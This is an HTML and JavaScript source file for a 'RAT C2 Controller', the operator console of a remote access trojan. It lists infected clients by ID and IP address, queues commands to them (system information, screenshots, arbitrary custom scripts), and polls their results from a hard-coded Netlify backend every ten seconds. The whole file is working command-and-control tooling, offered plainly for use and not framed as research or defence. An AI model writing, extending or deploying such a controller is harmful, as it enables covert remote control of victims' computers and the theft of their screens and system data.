<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rat C2 Controller</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
        }
        .section {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            margin: 20px 0;
            padding: 15px;
            border-radius: 5px;
        }
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 10px;
        }
        .client-card {
            background: #0f0f0f;
            border: 1px solid #333;
            padding: 10px;
            border-radius: 3px;
        }
        .client-card.active {
            border-color: #00ff00;
        }
        button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 8px 15px;
            margin: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
        }
        button:hover {
            background: #00cc00;
        }
        input, select, textarea {
            background: #0f0f0f;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
        }
        .log {
            background: #0f0f0f;
            border: 1px solid #333;
            padding: 10px;
            height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
        .response-item {
            margin: 5px 0;
            padding: 5px;
            background: #0a0a0a;
            border-left: 3px solid #00ff00;
        }
        .error {
            color: #ff0000;
            border-left-color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üêÄ RAT C2 CONTROLLER</h1>
            <p>Command & Control Interface</p>
        </div>

        <div class="section">
            <h3>Configuration</h3>
            <input type="text" id="serverUrl" placeholder="Server URL (e.g., https://your-site.netlify.app)" value="https://stupidideas.netlify.app">
            <input type="text" id="authToken" placeholder="Auth Token" value="">
            <button onclick="updateConfig()">Update Config</button>
        </div>

        <div class="section">
            <h3>Connected Clients</h3>
            <button onclick="refreshClients()">Refresh</button>
            <div id="clientsList" class="clients-grid"></div>
        </div>

        <div class="section">
            <h3>Send Command</h3>
            <select id="commandType">
                <option value="system_info">System Information</option>
                <option value="screenshot">Capture Screenshot</option>
                <option value="ping">Ping</option>
                <option value="custom_script">Custom Script</option>
            </select>
            <input type="text" id="targetClientId" placeholder="Target Client ID">
            <br><br>
            <textarea id="commandParams" placeholder="Command Parameters (JSON format)" rows="3"></textarea>
            <br>
            <button onclick="sendCommand()">Send Command</button>
        </div>

        <div class="section">
            <h3>Command Responses</h3>
            <button onclick="refreshResponses()">Refresh</button>
            <div id="responsesList" class="log"></div>
        </div>
    </div>

    <script>
        let serverUrl = 'https://stupidideas.netlify.app';
        let authToken = '';

        function updateConfig() {
            serverUrl = document.getElementById('serverUrl').value;
            authToken = document.getElementById('authToken').value;
            log('Configuration updated');
        }

        async function makeRequest(endpoint, method = 'GET', body = null) {
            const options = {
                method: method,
                headers: {
                    'Authorization': `Bearer ${authToken}`,
                    'Content-Type': 'application/json'
                }
            };

            if (body) {
                options.body = JSON.stringify(body);
            }

            const response = await fetch(`${serverUrl}/.netlify/functions${endpoint}`, options);
            return await response.json();
        }

        async function refreshClients() {
            try {
                const data = await makeRequest('/command');
                const clientsList = document.getElementById('clientsList');
                
                if (data.clients && data.clients.length > 0) {
                    clientsList.innerHTML = data.clients.map(client => `
                        <div class="client-card ${client.hasCommand ? 'active' : ''}">
                            <strong>ID:</strong> ${client.id}<br>
                            <strong>IP:</strong> ${client.ip}<br>
                            <strong>Last Seen:</strong> ${new Date(client.lastSeen).toLocaleString()}<br>
                            <strong>Status:</strong> ${client.hasCommand ? 'Command Pending' : 'Idle'}<br>
                            <button onclick="selectClient('${client.id}')">Select</button>
                        </div>
                    `).join('');
                } else {
                    clientsList.innerHTML = '<p>No clients connected</p>';
                }
            } catch (error) {
                log('Error refreshing clients: ' + error.message, true);
            }
        }

        function selectClient(clientId) {
            document.getElementById('targetClientId').value = clientId;
            log(`Selected client: ${clientId}`);
        }

        async function sendCommand() {
            const commandType = document.getElementById('commandType').value;
            const targetClientId = document.getElementById('targetClientId').value;
            let params = {};

            if (commandType === 'custom_script') {
                const paramsText = document.getElementById('commandParams').value;
                try {
                    params = JSON.parse(paramsText);
                } catch (e) {
                    log('Invalid JSON parameters', true);
                    return;
                }
            }

            try {
                const result = await makeRequest('/command', 'POST', {
                    clientId: targetClientId,
                    command: commandType,
                    parameters: params
                });
                
                log(`Command queued for ${targetClientId}: ${commandType}`);
                refreshClients();
            } catch (error) {
                log('Error sending command: ' + error.message, true);
            }
        }

        async function refreshResponses() {
            try {
                const data = await makeRequest('/response');
                const responsesList = document.getElementById('responsesList');
                
                if (data.responses && data.responses.length > 0) {
                    responsesList.innerHTML = data.responses.map(response => `
                        <div class="response-item ${response.error ? 'error' : ''}">
                            <strong>Client:</strong> ${response.clientId}<br>
                            <strong>Command ID:</strong> ${response.commandId}<br>
                            <strong>Time:</strong> ${new Date(response.timestamp).toLocaleString()}<br>
                            ${response.result ? '<strong>Result:</strong> ' + JSON.stringify(response.result, null, 2) : ''}
                            ${response.error ? '<strong>Error:</strong> ' + response.error : ''}
                        </div>
                    `).join('');
                } else {
                    responsesList.innerHTML = '<p>No responses yet</p>';
                }
            } catch (error) {
                log('Error refreshing responses: ' + error.message, true);
            }
        }

        function log(message, isError = false) {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = `[${timestamp}] ${message}`;
            console.log(logEntry);
        }

        // Auto-refresh
        setInterval(() => {
            refreshClients();
            refreshResponses();
        }, 10000);

        // Initial load
        updateConfig();
        refreshClients();
        refreshResponses();
    </script>
</body>
</html>
